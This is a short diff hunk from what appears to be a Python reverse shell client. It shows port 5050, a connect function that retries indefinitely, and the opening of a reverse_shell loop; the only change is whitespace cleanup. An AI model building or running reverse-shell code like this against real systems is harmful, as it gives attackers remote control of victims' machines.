@@ -23,7 +23,7 @@ port = 5050
 def server_connection():
     try:
         s.connect((host, port))
-    except: 
+    except:
         return server_connection()
 def reverse_shell():
     while True:
